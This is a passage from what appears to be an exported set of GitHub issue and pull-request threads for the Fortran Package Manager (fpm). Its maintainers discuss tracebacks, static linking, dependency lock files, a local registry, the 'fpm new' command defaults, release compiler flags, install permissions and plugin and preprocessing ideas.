                    "text": "Simple example traceback with ifort on my machine:\n/tmp/a$ cat src/a.f90 \nmodule a\n  implicit none\n  private\n\n  public :: say_hello\ncontains\n  subroutine say_hello\n    print *, \"Hello, a!\",1/0\n  end subroutine say_hello\nend module a\n/tmp/a$ ffpm run --compiler ifort\n + build/ifort_debug/app/a \nforrtl: severe (71): integer divide by zero\nImage              PC                Routine            Line        Source             \na                  0000000000403A3B  Unknown               Unknown  Unknown\nlibpthread-2.27.s  00007FF0FA1CE8A0  Unknown               Unknown  Unknown\na                  0000000000402B58  a_mp_say_hello_             8  a.f90\na                  0000000000402AD6  MAIN__                      5  main.f90\na                  0000000000402AA2  Unknown               Unknown  Unknown\nlibc-2.27.so       00007FF0F9BE8B97  __libc_start_main     Unknown  Unknown\na                  00000000004029AA  Unknown               Unknown  Unknown\n Command failed\nERROR STOP \n\nError termination. Backtrace:\n#0  0x7f33ebad3aed in ???\n#1  0x7f33ebad4605 in ???\n#2  0x7f33ebad5c93 in ???\n#3  0x55a39474ecd4 in __fpm_environment_MOD_run\n\tat src/fpm_environment.f90:127\n#4  0x55a394720049 in __fpm_MOD_cmd_run\n\tat src/fpm.f90:346\n#5  0x55a39471c63d in MAIN__\n\tat app/main.f90:37\n#6  0x55a39471c703 in main\n\tat app/main.f90:9\n/tmp/a$ ifort --version\nifort (IFORT) 19.1.0.166 20191121\nCopyright (C) 1985-2019 Intel Corporation.  All rights reserved.\n\nlk12325@ljk-laptop:/tmp/a$ uname -a\nLinux laptop 5.4.0-58-generic #64~18.04.1-Ubuntu SMP Wed Dec 9 17:11:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n\nAs expected in the Intel backtrace I can see the two relevant frames for my code: a_mp_say_hello_ (a.f90:8) and MAIN__ (main.f90:5)."
                },
                {
                    "user": "certik",
                    "date": "2020-12-23 17:34:21+00:00",
                    "text": "I firmly believe fpm needs to support static linking of Fortran binaries. That is a frequent and common use case.\nIn addition, we should also support dynamic linking for things like conda-forge or Debian.\nThat means for example the cmake backend that I plan to write should support both.\nSo the only question is how to specify this from the fpm point of view: it seems a command line switch like fpm build --static or something like that should work? We can argue about which way should be the default, I am fine either way."
                }
            ]
        },
        {
            "number": 322,
            "user": "LKedward",
            "date": "2020-12-21 15:42:41+00:00",
            "title": "Group sources by package in the model",
            "text": "Opening for feedback. Following the discussion here this PR implements a minimal set of changes to group source files by their originating package. This is primarily to facilitate the writing of third-party build back-ends but will also help separate static libraries for dependencies in a future PR like the Haskell version.\nThere are no changes to the targets that fpm generates in this PR.\nThe sources list in the model is replaced by a packages list where for now the new package_t type only contains a list of sources.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-24 10:47:42+00:00",
                    "text": "Thanks for the quick reviews; I've merged the latest changes from #291 and updated the info_model routines accordingly.\nYep you're right @certik, package dependency information is currently not captured at the level of the srcfile_t type."
                },
                {
                    "user": "certik",
                    "date": "2020-12-24 12:23:45+00:00",
                    "text": "Looks good to merge. Thanks!\n\u2026\nOn Thu, Dec 24, 2020, at 3:47 AM, Laurence Kedward wrote:\n\n\n Thanks for the quick reviews; I've merged the latest changes from #291\n <#291> and updated the\n `info_model` routines accordingly.\n\n Yep you're right @certik <https://github.com/certik>, package\n dependency information is currently not captured at the level of the\n `srcfile_t` type.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#322 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHQHE2RMOYSXVB5BYDSWML5ZANCNFSM4VEMD3SQ>."
                }
            ]
        },
        {
            "number": 321,
            "user": "awvwgk",
            "date": "2020-12-20 18:01:01+00:00",
            "title": "Implement support for a local registry",
            "text": "Before we make fpm aware of the fpm-registry, we should create a minimal working implementation for a local registry (this registry might even be built-in to simplify things a bit at the beginning).\nIn analogy to Cargo we could use a syntax like:\n[dependencies]\n[dependencies.toml-f]\nversion = \"^0.2.1\"\nregistry = \"internal\"  # or URI to a registry\n[dependencies.M_CLI2]\nversion = \"^0.1.0\"\nregistry = \"default\"  # for whatever the default URI will be\nThis requires:\n\na way to specify and match version requirements (src/fpm/versioning.f90 defines only a version type)\nthe possibility to cache dependencies in a project (we have build/cache.toml, alternatively a lock file)\na format for the registry (JSON?, TOML?, XML?, SQL?) and an fpm package implementing the format\n(the fpm-registry has both TOML and JSON representations of the registry right now)\nan interface to fetch from URIs that are not local:// or file:// (libcurl interface or just shell escape to curl/wget)\n\nA full registry is discussed in #35",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-21 12:32:40+00:00",
                    "text": "This is a sensible approach. I think it would be beneficial to be able to specify a local path.\nFor parsimony it makes sense to use TOML for the registry format, to avoid needing an additional dependency.\nFor fpm-registry, I distinguish between the TOML registry file and the JSON index file; the former is manually edited and hence contains the minimum information necessary, whereas the latter is generated from the former and contains additional information required for browsing/searching packages. Some dependency information is also included which could be used to fetch dependencies faster. JSON was used merely because I thought I'd need to load it dynamically with Javascript, but then I realised that Jekyll could consume it directly. So the index format can change."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 14:25:51+00:00",
                    "text": "Should fpm be able to consume both a registry file and an index file (generating the latter by processing the former)?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-21 14:37:42+00:00",
                    "text": "I had envisaged that fpm would only interact with the index file since it can convey information stored within the package manifest without needing to download the package.\nGenerating the index requires downloading every package in the registry and reading its manifest, so I'm not sure we want fpm to do that?"
                }
            ]
        },
        {
            "number": 320,
            "user": "awvwgk",
            "date": "2020-12-20 17:11:57+00:00",
            "title": "Create a dependency lock file",
            "text": "The current dependency handler creates a cache in build/cache.toml which was intended as prototype for the lock file, for fpm the cache would look like:\n[fpm]\nversion = \"0.1.3\"\nproj-dir = \".\"\n[toml-f]\nversion = \"0.2.1\"\nproj-dir = \"build/dependencies/toml-f\"\ngit = \"https://github.com/toml-f/toml-f\"\nobj = \"2f5eaba864ff630ba0c3791126a3f811b6e437f3\"\nrev = \"2f5eaba864ff630ba0c3791126a3f811b6e437f3\"\n[M_CLI2]\nversion = \"0.1.0\"\nproj-dir = \"build/dependencies/M_CLI2\"\ngit = \"https://github.com/urbanjost/M_CLI2.git\"\nobj = \"e59fb2bfcf36199f1af506f937b3849180454a0f\"\nrev = \"e59fb2bfcf36199f1af506f937b3849180454a0f\"\nNote that the git object in package manifest is currently used in fpm as alternative to a lock file. The information required for the lock file should boil down to the package name, its version and the git revision, which are already present in the dependency cache.\nIn principle, we have everything together to promote the dependency cache to a dependency lock (fpm.lock?).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-12-23 00:30:48+00:00",
                    "text": "Yes, fpm.lock like Cargo.lock."
                },
                {
                    "user": "Carltoffel",
                    "date": "2021-09-30 10:34:23+00:00",
                    "text": "Will the fpm.lock go into the main directory (like with cargo) so it can be easily included in git? (for reproducible builds)\nEdit: Otherwise the file would be excluded by default because of the automatically (re-)created .gitignore inside the build directory (see #525)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-30 12:33:00+00:00",
                    "text": "The cache.toml is purposely put in the build directory to avoid checking it into version control, as the format might change in the future. The final lock file will be in the project root once we decided on a suitable format."
                }
            ]
        },
        {
            "number": 317,
            "user": "urbanjost",
            "date": "2020-12-19 22:48:07+00:00",
            "title": "subcommand update updates from cache list and so still updated deleted dependencies",
            "text": "A small issue, but starting with a program with a dozen external dependencies and working on it mostly being self-contained\nI was down to three external dependencies but an update still continued to refresh all the dependencies I started with, requiring me to either delete the build/ directory or edit the cache list in build/.  Relatively easy to work around if you know it has a cache,\nand maybe not a typical use case but it would be nice if only currently active dependencies are updated/built/listed .... If an update rebuilt the cache list I think that would be sufficient -- low priority but would be nice if that were \"clean\" in this respect. Probably not necessary to actually delete the unused dependencies files, that might even be undesirable.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-20 10:27:30+00:00",
                    "text": "There is fpm update --clean for this purpose, this will discard the cache and start from scratch."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-20 16:21:01+00:00",
                    "text": "Yes; that works great; just considering whether the currently listed dependencies should be referenced instead of the cache.\nThe behavior of fpm has changed with the cache being added.  It stil appears to check the fpm.toml file if a completely new dependency is added but then does not automatically quit building ones no longer referenced. Seemed like the user-facing file (the fpm.toml manifest) should drive what is built and run automatically.  If I add something to the fpm.toml file it starts building it; so if I remove something from the fpm.toml file it would be nice if it quit building it.  Seems more consistent.\nDeleting dependenciesis probably far less frequent than adding them will be but in this case taking a dozen out of the fpm.toml\nfile and still seeing them build when I tried a few other compilers or a --release build felt surprising and seemed like it might be\nsome low hanging fruit to improve.  update has been working great otherwise. Nice to not have to wipe the build/ directory every time something goes awry or needs updated."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-20 17:38:17+00:00",
                    "text": "Thanks for the feedback, the cache was meant as prototype for the dependency lock file. Since we are automatically adding dependencies we should have the same feature for the deletion of dependencies as well."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-12 15:17:56+00:00",
                    "text": "Somewhat related to #355, I'm flattening the dependency tree structure while constructing it, but it should retain the relations between the packages by some means. With a simple sweep one could find disconnected dependencies and delete them from the cache."
                }
            ]
        },
        {
            "number": 316,
            "user": "urbanjost",
            "date": "2020-12-18 17:07:09+00:00",
            "title": "Update subcommand \"new\" to reflect the addition of support for the ex\u2026",
            "text": "\u2026ample/ directory\nThe \"new\" subcommand was updated with an --example switch in line with the other\nstandard directories. Corresponding changes were made to the documentation and\nthe test of the \"new\" subcommand. This reflects the addition of --example to the\n\"run\" subcommand and the model changes to automatically build applications found\nin the example/ directory.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-18 17:07:41+00:00",
                    "text": "This should close #306"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-21 00:29:04+00:00",
                    "text": "I think example/ and a program source file in it should be created by default, as originally implemented in this PR, and for the same reason that @urbanjost explained above.\nLet's get more eyes on this. @certik @everythingfunctional @LKedward what do you think is a saner default?\nOtherwise I think this PR is good to go."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-21 00:30:46+00:00",
                    "text": "If we choose creating example/ as default, what's the purpose of \"fpm new ... --example\"?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 00:41:28+00:00",
                    "text": "They are all created by default, but conditionally if any name is supplied. So if you really only wanted src/ or app/ you can do that\nso you could create a project that only added examples to an external project that only had a src/ directory; you can change your mind and do a --backfill  (although there is a current problem where you cannot say \".\" but have to do something like \"fpm new pwd --backfill\" if you are sitting in the directory, but we do not have a portable realpath(3c) equivalent yet), ...\nSo primarily for someone who created a package without some of the directories and wants to use \"fpm new --backfill\" because things are growing.  Admittedly, an experienced user might say \"mkdir example\"."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-21 00:43:16+00:00",
                    "text": "@urbanjost ah, got it, it makes sense."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 00:56:52+00:00",
                    "text": "An experienced user may not even need \"new\"; but I found new users confused (as I was) as to what to do next with a very old version of h-fpm when I wanted to try it out (as it did not make anything by default, if I remember right) ; and I think at least the directories with an associated command should be created by default (\"run\", \"test\") and a good number of projects will need a src/ directory (although a good number may just need app/ as more packages and stdlib become available).  I still prefer having example included because I think an advanced user hardly needs \"new\" and a new user does, and for the reasons above, but have been thinking after trying to move existing projects that having an option in the fpm.toml file that allowed adding directory names to the auto-build list might be another path; and did not see much reaction to my preference for it to be symetricall with \"run --app --test --example -bench \" and commands \"run\", \"test\", \"example\",\"bench\" which would just be abbreviations for \"run --example\", \"run --bench\", ...  so I was thinking long-term being able to specify a list of directories to auto-build and a run option like \"run --dir NAME\" might be a more generic solution. So I prefer example/ being built, but long-term do any of those alternatives and a \"new --template\" might be a longer-term solution?  I could even see an interactive mode where I get prompted, like \"do you need coarrays?\" \"do you need to add options to load external libraries?\" but nothing solid on that. At some point I am sure there will be a doc/ directory as well but nothing will probably need built there unless we start supplying utilities to convert flat text or markdown to HTML|PDF|*roff.\nBut, for example, if no one else wants a bench/ directory added but I do if I could add bench/ to the auto-search and could say\nrun NAME --dir bench  (especially with aliases like rfpm @bench NAME  or some other ability like git(1) has to add aliases but that is another story)  I would be relatively happy."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-21 12:11:15+00:00",
                    "text": "I think example/ and a program source file in it should be created by default, as originally implemented in this PR, and for the same reason that @urbanjost explained above.\n\nI agree that we should encourage good practices such as including tests and examples; however, unlike tests which are needed during development, examples are usually the very last thing I add, after stabilising the API interfaces and writing documentation. Hence if an example is created by default, for me at least, it would remain a redundant stub for the majority of the development time. I would probably immediately delete the example folder if created by default."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-21 12:19:17+00:00",
                    "text": "I'm also in support of your suggestion @urbanjost of not writing explicit entries for executables/tests/examples in the manifest when using 'fpm new' and instead relying on the automatic source discovery; this simplifies the experience IMO. Explicit entries for tests and executables are now only required for non-standard package layouts or per-executable dependencies."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 23:10:28+00:00",
                    "text": "Throwing this approach out there as a way to compromise between being able to setup for a basic package with the simplest possible interface but also providing for an introduction to producing a full large package. A new user entering \"new\" and seeing nothing but a blank slate and having to dig in for every next step is not good either, so perhaps this approach works. I know it took me a while using an early prototype to answer \"and now what?\".  So a new user can enter \"fpm new A\" and go into \"A\" and run \"fpm build\", \"fpm run\", and \"fpm test\" and have something intuitive happen with nothing but metadata in the toml file, which is a good introduction to a basic setup and shows how easy it can be to use; but hopefully having read the documentation at some point for \"new\" he can seed a project that describes more complex options and makes a working directory with a complex example file.  For more than that I think a --template option and/or having simple examples in a repository would be nice too.  The HTML document is changing rather rapidly at this point, but perhaps a \"fpm help manifest\" would be worthwhile.  So functionally this provides a solution for the two major divergent needs.  Not sure it is quite elegant myself though.  So\n\nfpm new A   # A bare-bones starter with the simplest configuration\nfpm new B --verbose  # A similar project but with the full default file structure and a detailed annotated manifest"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-21 23:16:22+00:00",
                    "text": "To me --verbose should only ever affect output to stdout, and not what's being created in the process. Perhaps a different word, like, --full or --all is more appropriate?\nThough I'd prefer fpm new A --clean or fpm new A --bare for a bare-bones starter, and just fpm new A for everything.\nThese are only 2 ends of the spectrum. Some middle ground could also be an option (like what I think @LKedward and @awvwgk prefer)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 23:27:15+00:00",
                    "text": "Creating a \u201cfull\u201d manifest should be easier than having to hard-code everything. Also, is there a check to verify that the hard-coded TOML document is a valid TOML document except for running fpm new [--verbose] test && cd test && fpm run?\nI would suggest to generate the TOML data structure by using the TOML-Fortran build interface (set_value, add_table, add_array) and than accept a serializer (pass an instance of a toml_serializer to the accept procedure of the toml_table). To verify and generate the full package manifest the built TOML data structure can be passed to the new_package routine, on exit the TOML data structure will contain all default values and can be just serialized.\nEdit: You can check with a minimal fpm project depending on fpm:\nprogram prog\n  use fpm_toml\n  use fpm_manifest_package\n  use fpm_error\n  implicit none\n  type(toml_table) :: table\n  type(toml_serializer) :: ser\n  type(package_config_t) :: package\n  type(error_t), allocatable :: error\n  table = toml_table()\n  ser = toml_serializer()\n  call set_value(table, \"name\", \"example\")\n  ! continue building of manifest\n  ! ...\n  call new_package(package, table, error)\n  if (allocated(error)) error stop\n  call table%accept(ser)\nend program prog"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-22 05:50:01+00:00",
                    "text": "So, combining the above:\nfpm new A      # makes what it did before except it creates example/ but in such a way that deleting example/ or test/ or app/ \n                      # does not require changing the manifest file\nfpm new A --full   # creates the same but with a heavily annotted manifest file, and maybe more later like a dependency on\n                            # stdlib\nfpm new A --bare  # makes no directories or sample Fortran source\nThe small manifest file is made by calls so it should be self-verifying\nThe annotated manifest (whose main purpose is to be verbose and annotated) is built manually but run through a verification\nroutine.\n--verbose now displays the verified components of the manifest file.\nSo @certik and I get the example/ directory;  and the TOML is verified and you can start out with nothing if you are an advanced user and the default manifest depends on auto-completion so deleting directories will not hurt till you have nothing to build at all for everyone else; with a low, medium and high setting.\nExcept my validate routine did not work.  I added a typo (literally the line \"[typo]\" and my routine did not complain. Before I spend too much time on that I think someone will now immediately what I did wrong in the validation  routine?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-22 09:54:03+00:00",
                    "text": "Except my validate routine did not work.  I added a typo (literally the line \"[typo]\" and my routine did not complain. Before I spend too much time on that I think someone will now immediately what I did wrong in the validation  routine?\n\nThe validation routine looks fine too me. If you literally added [typo] on a line this is still valid TOML, not a valid fpm manifest, but that is not checked for in toml_parse but only in get_package_data. Since the TOML document is static, the validation check should be part of the testsuite rather than the runtime."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-22 12:39:15+00:00",
                    "text": "OK; I was holding off on the test suite until there was some kind of consensus on the format. Because I want heavy annotation it seems easier to continue to build the --full file \"manually\", hence the two approaches for buildng the file. For people with WWW access I think pulling down templates or examples would be useful, as configuring manifests seems to be the universal complaint about package managers and using the TOML files the first few times can be difficult (no matter what TOML stands for).  There is not, as @certik pointed out, one problem with one solution here. What a new user needs is quite different than  someone with dozens of packages; but I imagine a good deal of users will only make one or two packages so it being easy for a new user to set up a package is a critical point for getting fpm accepted.\nThe auto-discovery and support of link options and C has moved that along immensely.  I tried with just a basic graphics package and the need for X11 and C  early on and it was difficult with h-fpm and a show-stopper for f-fpm. Now, with no fpm.mk and a manifest with nothing but a link directive and metadata I can build the library with mixed C and Fortran and build, run a dozen sample programs and run dozens of test cases and it can be used as an external dependency. Nice and Easy.\nSo is this too complicated or does this three-pronged approach satisfy anyone?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-22 13:43:23+00:00",
                    "text": "Apologies @urbanjost, I didn't mean to complicate everything with my comments, but it seems you've come up with a nice solution!\nfpm new covers my most common use case for quickly spinning up a new project whereas fpm new --full is well suited to beginners who may benefit from seeing the explicit manifest entries."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-22 17:23:30+00:00",
                    "text": "I apologize, I didn't realize that in this thread we were discussing both what directories to create and what metadata to put into the manifest by default. Everything I wrote so far I meant only for creating directories and files but I didn't consider what to do with the manifest.\n@urbanjost's latest proposal looks good to me."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-23 02:26:53+00:00",
                    "text": "It is interesting that just a few stub files exposes how differently everyone can work.  I use a preprocessor that allows for flat text documentation to be placed right in the source file and vim(1) folding so show just text or just code when I want ( a nice feature of vim, but I usually just edit the files anymore as-is) and part of the documentation is (almost) always a simple working example of the routine, so I  have demo routines long before the package is complete. When not involved with the WWW I also have a testing framework that builds up unit tests with builds building an SQLite file with tallies of test results, but that requires so much infrastructure to be assumed I have moved most of my testing external to the code. Where I can use that it allows you to call a single routine in the library that does confididences tests for that particular build which can be handy.  So as soon as I have a src/ or app/ I need an example/; albeit in a way they act as initial confidence tests more than examples. I have already seen in a relatively small group here that each has a different preference for what is created or not, which is interesting.\nBut for a a new user whatever gets created should do something with the core commands (build, test, run) and the default here does.  It should also not be a puzzle to figure out  the TOML file synax immediately if you delete something you decide you do not need, which this does. But I new user needs as much help with the TOML configuraion as possible, and in the earlier versions it was a black box and you had to bounce around half a dozen web sites to piece together how to use it, and this and more complete documentation is helping with that; and for an old-hand the --bare option saves a few commands but lets them build their own so I am happy with this as a compromise. It has the low/middle/high capabilities brought up earlier.\ntime for a ~/.fpmconfig?\nIt introduces a lot of dependencies and system-dependencies but I would really like new to read the [user] data a lot of git(1) users have in their .gitconfig files and the TOML file could literally be a black box for basic projects now that auto-discovery has advanced so much.  In lieu of piggy-backing on .git (which hg users might not be fond of]  are there other uses needed now that would justify  creating a ~/.fpmconfig file other than username and email?  Maybe a default compiler for builds?"
                },
                {
                    "user": "certik",
                    "date": "2020-12-24 12:36:34+00:00",
                    "text": "Just like Sebastian, I felt it should not create examples by default.\n\nUrbanjost explained above why it's a good idea to include them by default.\n\nI think it's for a wider discussion what the default behavior should be.\n\nContrary to what was said, I use new very frequently, just like git init. I use it for all kinds of quick projects to test things out. So the default behavior matters a lot I think.\n\u2026\nOn Sun, Dec 20, 2020, at 5:29 PM, Milan Curcic wrote:\n\n\n I think example/ and a program source file in it should be created by\n default, as originally implemented in this PR, and for the same reason\n that @urbanjost <https://github.com/urbanjost> explained above.\n\n Let's get more eyes on this. @certik <https://github.com/certik>\n @everythingfunctional <https://github.com/everythingfunctional>\n @LKedward <https://github.com/LKedward> what do you think is a saner\n default?\n\n Otherwise I think this PR is good to go.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#316 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWG5PD7YAMYOUTWER2DSV2JF3ANCNFSM4VBOAU7Q>."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-30 13:06:17+00:00",
                    "text": "@urbanjost could you bring this branch up-to-date with the default branch again. I'll try to have a look over the changes hopefully next week(end)."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-01 00:19:42+00:00",
                    "text": "So essentially\n\nfpm new A  does what it did before\nfpm new A --full additionally creates example/ and a  heavily annotated fpm.toml file including examples of remote dependencies\nfpm new A --bare creates no directories or example Fortran code, just the fpm.toml and .gitignore files\nso you have a bare-bones, middle, and all-default-directories.\n\nThe default fpm.toml file is reduced and depends on auto-search so that a user can arbitrarily remove any of src/, app/, and test/ created by the default new command.\nIn the mean time project names allowing hyphens are allowed; the documention reflects the changes.\nSeveral routines that might become of general use were moved to the appropriate general-function modules.\nIn the end I think more of the design was thrashed out here than in the initial #306 discusssion but I think this takes into account all the comments without coming out looking like it was \"designed by committe\",  so last call -- anything else?\nPS: There was no feedback on using a ~/fpmconfig file to initialize the fpm.toml metatadata; not about having a set of templates or example to pull via an option. At some point I think the built-in documentation should mention how to pull down the examples from the fpm web pages.  I might open those as seperate issues later but they wil not be included here."
                },
                {
                    "user": "LKedward",
                    "date": "2021-02-18 13:57:08+00:00",
                    "text": "Thanks @urbanjost and apologies for the delay in merging this. I think your solution addresses all the points raised and so with two reviews (thanks @awvwgk) I will now merge."
                }
            ]
        },
        {
            "number": 315,
            "user": "LKedward",
            "date": "2020-12-18 11:14:48+00:00",
            "title": "Remove: -ffast-math in gfortran default release flags",
            "text": "I think it has been agreed generally in previous discussions that -ffast-math should be an opt-in option by the package maintainer rather than enabled by default. This PR therefore removes -ffast-math from the gfortran default flags for --release.\nI encountered this because the stdlib testsuite does not pass with fpm test --release when using stdlib with fpm.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-18 13:44:12+00:00",
                    "text": "For consistency they should be removed from the Haskell version as well:\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n         Line 684\n      in\n      483f23b\n    \n    \n    \n    \n\n        \n          \n           , \"-ffast-math\" \n        \n    \n  \n\n\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n         Line 717\n      in\n      483f23b\n    \n    \n    \n    \n\n        \n          \n           , \"-ffast-math\" \n        \n    \n  \n\n\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n         Line 745\n      in\n      483f23b\n    \n    \n    \n    \n\n        \n          \n           , \"-ffast-math\""
                },
                {
                    "user": "certik",
                    "date": "2020-12-23 00:26:51+00:00",
                    "text": "This PR is fine, as a quick fix, but it is not the long term solution because we are leaving a lot of performance on the table. So I opened an issue #329 to brainstorm a solution to this."
                }
            ]
        },
        {
            "number": 314,
            "user": "awvwgk",
            "date": "2020-12-18 11:13:38+00:00",
            "title": "Allow file permissions for fpm-install",
            "text": "Currently the install command can only copy files from the build directory to a prefix. As pointed out in #257 it would be helpful to define permissions for the installed executables as well.\nFor this purpose we could search for the install program and leverage the built-in permission handling or do the permissions ourselves using chmod. This will probably be limited to POSIX platforms (Unix and Cygwin).",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-19 01:56:04+00:00",
                    "text": "There is a WHICH(3f) function in  my collection I added to M_io.f90 that might be useful.  I wrote it for POSIX and Windows but have not used MSWindows much but if it does not work there I think it would be easy to change.M_io.\nIt gets the environment variable PATH and then parses it and then joins it with the command name and then uses INQUIRE to see if the file exists.  If install is not there it could look for chmod or whatever other systems have that might be equivalent. I just pulled it into M_io and did not test it much but the idea has worked successfully in several situations -- looking on a system to see which Adobe PDF viewer can be found, what browers are available, what GIF display command is available, ... . I need to add a unit test for it and do some testing but that should not prevent you from taking a quick look to see if the idea appeals to you.\n."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-19 01:59:44+00:00",
                    "text": "It calls a few other procedures, but copies or equivalents are already in fpm --- split, join_path (or joinpath?), instead of the separator function there is an OS detection routine that would give you the same feature and would cut down on duplication.\nIf you want me to make an \"fpm\" version let me know.\nI guess now all I have to say instead is\n cd /tmp\n git clone https://github.com/urbanjost/M_io\n cd M_io\n fpm run --example demo_which\nbefore install existed in fpm I was using a shell script called \"fpm-install\" that might be relevant\n#!/bin/bash\n#@(#) install executables in directory (assuming install(1) exists)\nDIR=${FPM_INSTALL_DIR:-\"$HOME/.local/bin\"}\nmkdir -p $DIR\nffpm run  --release --compiler gfortran --runner \"install -vbp -m 0711 -t $DIR\" $*"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-19 16:23:34+00:00",
                    "text": "I have a similar path-reader in one of my projects (here), which I use to search for config or parameter files. This one could be repurposed as which clone as well.\nThis sounds like a feature for stdlib_os in my opinion. I wonder if we could port this one easily from CMake to fpm?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-20 23:00:09+00:00",
                    "text": "Amazing project.  Lost myself for a while in it.  Tried moving it to fpm and get hung up with Fortran fpm not having an fpm.mk option and there being no way without making a custom version or using backdoors like ifort configuration files to customize the compiles and links with fpm yet. That stopped me with some much simpler projects that just required X11 Windows or an external package.  Have tried a few approaches (including response files which I added to a newer version of M_CLI2, and \"external packages\" that really were not a package, looked at some other package managers ..) and really did not find anything that did not seem like a kludge or required so much customizing it was easier to just do it with Make/CMake ...) . Maybe there is no elegantly simple way to handle cuda/MPI/OpenMPI/OpenACC/coarrays... until coarrays develops further).\nSo I am thinking the main point is it does not have to be simple to set up, but able to be packaged in such a way it is simple for a user of the package to use as much as possible. Allowing multiple compilers complicates that too.  My own system builds everything into a production layout directly, where two variables (one for OS, one for a compiler) to build the directory. The two variables are set automatically but can be set by the user. So instead of \"Linux\" and \"ifort\" you can make up other names like \"ifort_coarray\" and add an entry in a file that defines the switches, but that does not quite fit the fpm model. The solution has to bundle with the package to be easily useable by an end-user of the package."
                }
            ]
        },
        {
            "number": 313,
            "user": "certik",
            "date": "2020-12-17 19:28:38+00:00",
            "title": "Create plugin system for extending `fpm` from 3rd party packages",
            "text": "This was first mentioned here:\n#309 (reply in thread)\nThe idea is that people are already writing many 3rd party tools for everything from formatting, automatic documentation lookups, pre-processors, etc. Many of these tools require to understand the structure of the project, which fpm knows and can provide to them, so that lfortran fmt can format your whole project, it would get the list of files from fpm.\nIt could go the other way too, so that fman can register a new command fpm man, which would look up things, or lfortran can register fpm fmt. Similar to how git can be extended by simply providing a tool git-something in a $PATH and git something becomes available.\nThe way various Jupyter kernels register with jupyter is that they simply create a file in $PREFIX/share/jupyter/kernels/fortran/kernel.json, which creates a fortran kernel. So in the same way, fman can install a file $PREFIX/share/fpm/plugins/fman/plugin.json which has information where to find fman and anything else needed for fpm to be able to call it. The way this works with Jupyter is that you just install lfortran (say using conda install lfortran) and it will automatically appear in Jupyter as an optional kernel, users do not have to do anything, it just works.\nLet's brainstorm this more.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-17 19:39:42+00:00",
                    "text": "See #211 for a previous occurrence of this suggestion."
                },
                {
                    "user": "certik",
                    "date": "2020-12-17 19:44:08+00:00",
                    "text": "Thanks, I missed that. I'll copy my text above to that issue."
                }
            ]
        },
        {
            "number": 308,
            "user": "everythingfunctional",
            "date": "2020-12-15 21:15:00+00:00",
            "title": "A Long Term Goal For Preprocessing",
            "text": "A killer functionality that would be nice to have as part of fpm, would be the ability to use Fortran code to generate Fortran code as part of preprocessing a source file.\nRust has intelligent macros, which provide a similar capability. I don't remember if it's part of stack or the Haskell language itself, but they have a directive which can call a tool, which might be built as part of the current package, to generate some source code. For example, I created a testing framework in Haskell (here) similar to my vegetables framework, where the \"main\" test program only contains the following line:\n{-# OPTIONS_GHC -F -pgmF hedge-trimmer #-}\nIt would be awesome if my test driver program could contain just a similar line.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-12-16 10:56:42+00:00",
                    "text": "I can't find the thread right now, but I recall reading the minutes from a standards committee meeting (perhaps related to generics?), where they decided not to pursue intelligent macros as part of the language. This means that any potential preprocessing facilities we invent would be specific to fpm.\nDo you have any other motivations for such meta-programming facilities apart from unit testing? Is what you have in mind similar in functionality to Julia's @test macro? I think D also has a similar unit test capability, e.g. if you look into the D ascii module you find code like this:\n/++\n    Params: c = The character to test.\n    Returns: Whether `c` is a letter or a number (0 .. 9, a .. z, A .. Z).\n  +/\nbool isAlphaNum(dchar c) @safe pure nothrow @nogc\n{\n    return c <= 'z' && c >= '0' && (c <= '9' || c >= 'a' || (c >= 'A' && c <= 'Z'));\n}\n///\n@safe pure nothrow @nogc unittest\n{\n    assert( isAlphaNum('A'));\n    assert( isAlphaNum('1'));\n    assert(!isAlphaNum('#'));\n    // N.B.: does not return true for non-ASCII Unicode alphanumerics:\n    assert(!isAlphaNum('\u00e1'));\n}\nI was thinking in the past of prototyping something like this as a demonstration of using symengine.f90. The idea was you could do your symbolic manipulation in Fortran, and then \"print\" the resulting symbolic expressions into Fortran commands. Building upon my example from Discourse, I envisioned something 